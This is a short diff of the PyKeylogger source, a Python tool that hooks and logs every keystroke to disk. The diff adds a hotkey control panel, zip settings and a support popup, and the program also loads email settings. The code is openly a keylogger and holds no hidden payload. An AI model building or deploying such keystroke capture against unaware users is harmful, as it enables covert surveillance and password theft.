@@ -2,11 +2,14 @@ import pyHook
 import time
 import pythoncom
 import sys
+import imp
 from optparse import OptionParser
 import traceback
 from logwriter import LogWriter
 import version
 import ConfigParser
+from controlpanel import PyKeyloggerControlPanel
+import Tkinter, tkMessageBox
 
 class KeyLogger:
     ''' Captures all keystrokes, calls LogWriter class to log them to disk
@@ -35,8 +38,9 @@ class KeyLogger:
         '''
         self.lw.WriteToLogFile(event)
         
-        if event.Key == self.settings['exitkey']:
-            self.stop()
+        if event.Key == self.settings['controlkey']:
+            PyKeyloggerControlPanel(self.settings, self)
+            #self.stop()
             
         return True
     
@@ -68,9 +72,19 @@ class KeyLogger:
         self.settings.update(dict(self.config.items('email')))
         self.settings.update(dict(self.config.items('logmaintenance')))
         self.settings.update(dict(self.config.items('timestamp')))
-        self.settings.update(self.options.__dict__)
+        self.settings.update(dict(self.config.items('zip')))
+        self.settings.update(self.options.__dict__) # add commandline options to our settings dict
                     
 if __name__ == '__main__':
+    def main_is_frozen():
+        return (hasattr(sys, "frozen") or # new py2exe
+                hasattr(sys, "importers") or # old py2exe
+                imp.is_frozen("__main__")) # tools/freeze
+    
+    if not main_is_frozen(): #comment out this if statement to remove support request
+        root=Tkinter.Tk()
+        tkMessageBox.showinfo(title="Please support PyKeylogger", message="Please support PyKeylogger")
+        root.destroy()
     kl = KeyLogger()
     kl.start()
     
